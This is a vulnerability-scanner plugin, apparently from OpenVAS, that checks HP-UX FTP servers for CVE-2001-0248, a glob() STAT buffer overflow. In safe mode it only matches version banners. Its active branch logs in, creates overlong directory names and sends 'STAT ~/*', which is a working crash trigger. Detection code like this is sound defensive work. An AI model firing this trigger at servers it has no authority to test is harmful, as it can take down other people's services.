# SPDX-FileCopyrightText: 2003 Xue Yong Zhi
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.11372");
  script_version("2023-07-21T05:05:22+0000");
  script_tag(name:"last_modification", value:"2023-07-21 05:05:22 +0000 (Fri, 21 Jul 2023)");
  script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/2552");
  script_tag(name:"cvss_base", value:"10.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_cve_id("CVE-2001-0248");
  script_name("HP-UX ftpd glob() Expansion STAT Buffer Overflow");
  script_category(ACT_MIXED_ATTACK);
  script_tag(name:"qod_type", value:"remote_analysis");
  script_family("FTP");
  script_copyright("Copyright (C) 2003 Xue Yong Zhi");
  script_dependencies("ftpserver_detect_type_nd_version.nasl", "ftp_writeable_directories.nasl");
  script_require_ports("Services/ftp", 21);
  script_mandatory_keys("ftp/login", "ftp/writeable_dir", "ftp/banner/available");

  script_tag(name:"solution", value:"- Upgrade your FTP server.

  - Consider removing directories writable by 'anonymous'.");

  script_tag(name:"summary", value:"Buffer overflow in FTP server in HPUX 11 and previous
  allows remote attackers to execute arbitrary commands by creating a long pathname and calling
  the STAT command, which uses glob to generate long strings.");

  script_tag(name:"solution_type", value:"VendorFix");

  exit(0);
}

# TODO: have not observed enough HP-UX FTP banners, safecheck
# is inaccurate and even wrong!
#
# TODO: do not check other FTPD
#
# From COVERT-2001-02:
# "when an FTP daemon receives a request involving a
# file that has a tilde as its first character, it typically runs the
# entire filename string through globbing code in order to resolve the
# specified home directory into a full path.  This has the side effect
# of expanding other metacharacters in the pathname string, which can
# lead to very large input strings being passed into the main command
# processing routines. This can lead to exploitable buffer overflow
# conditions, depending upon how these routines manipulate their input."

include("ftp_func.inc");
include("misc_func.inc");
include("port_service_func.inc");

port = ftp_get_port(default:21);

kb_creds = ftp_get_kb_creds();
login = kb_creds["login"];
password = kb_creds["pass"];
wri = get_kb_item("ftp/writeable_dir");

safe_checks = 0;
if(!login || !password || !wri || safe_checks())
  safe_checks = 1;

if(safe_checks) {
  banner = ftp_get_banner(port: port);
  if(banner) {
    vuln = FALSE;

    #HP-UX 10.0, 10.10, 10.20, 10.30, 11.0(ICAT)
    #HP HP-UX 10.0.1, 10.10, 10.20, 11.0 and HP HP-UX (VVOS) 10.24, 11.0.4(bugtrap)
    #Actually Looking for 10.*, 11.0* here
    if(ereg(pattern:"FTP server.*[vV]ersion[^0-9]*(10\.[0-9]+|11\.0)", string:banner))
      vuln = TRUE;

    if(vuln) {
      security_message(port:port);
    }
  }
  exit(0);
}

soc = open_sock_tcp(port);
if(soc) {
  if(login && wri) {
    if(ftp_log_in(socket:soc, user:login, pass:password)) {
      c = string("CWD ", wri, "\r\n");
      send(socket:soc, data:c);
      b = ftp_recv_line(socket:soc);
      if(!ereg(pattern:"^250.*", string:b)) exit(0);
      mkd = string("MKD ", crap(505), "\r\n"); #505+4+2=511
      mkdshort = string("MKD ", crap(249), "\r\n"); #249+4+2=255
      stat = string("STAT ~/*\r\n");

      send(socket:soc, data:mkd);
      b = ftp_recv_line(socket:soc);
      if(!ereg(pattern:"^257 .*", string:b)) {
        #If the server refuse to create a long dir for some reason, try a short one to see if it will die.
        send(socket:soc, data:mkdshort);
        b = ftp_recv_line(socket:soc);
        if(!ereg(pattern:"^257 .*", string:b)) exit(0);
      }

      #STAT use control channel
      send(socket:soc, data:stat);
      b = ftp_recv_line(socket:soc);

      send(socket:soc, data:'RMD ' + crap(505) + '\r\n');
      send(socket:soc, data:'RMD ' + crap(249) + '\r\n');

      if(!b){
        security_message(port:port);
        exit(0);
      } else {
        ftp_close(socket:soc);
      }
    }
  }
}
